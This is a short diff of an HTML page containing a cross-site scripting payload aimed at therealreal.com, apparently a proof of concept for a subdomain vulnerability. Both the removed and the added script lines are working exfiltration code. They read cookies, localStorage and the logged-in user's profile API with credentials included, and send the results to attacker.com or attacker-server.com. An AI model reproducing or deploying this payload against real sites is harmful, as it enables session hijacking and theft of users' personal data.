@@ -1,23 +1,23 @@
 <html>
 <body>
 <script>
-  // Exfiltrate cookies
-  fetch('https://attacker.com/log?cookies=' + encodeURIComponent(document.cookie));
-  
-  // Exfiltrate localStorage
-  let storage = {};
-  for (let i = 0; i < localStorage.length; i++) {
-    let key = localStorage.key(i);
-    storage[key] = localStorage.getItem(key);
-  }
-  fetch('https://attacker.com/log?storage=' + encodeURIComponent(JSON.stringify(storage)));
-  
-  // Make authenticated API call to user profile
-  fetch('https://www.therealreal.com/api/user/profile')
-    .then(r => r.json())
-    .then(data => {
-      fetch('https://attacker.com/log?profile=' + encodeURIComponent(JSON.stringify(data)));
+// Because this is on a subdomain of therealreal.com, 
+// we may have access to shared cookies or localStorage 
+// depending on the domain configuration.
+// Even if cookies are scoped to 'www', this proves the 
+// vulnerability allows code execution on the trusted domain.
+
+fetch('https://www.therealreal.com/api/v1/user/me', {
+    credentials: 'include' // Sends cookies
+})
+.then(response => response.json())
+.then(data => {
+    // Exfiltrate sensitive user data
+    fetch('https://attacker-server.com/log', {
+        method: 'POST',
+        body: JSON.stringify(data)
     });
+});
 </script>
 </body>
 </html>
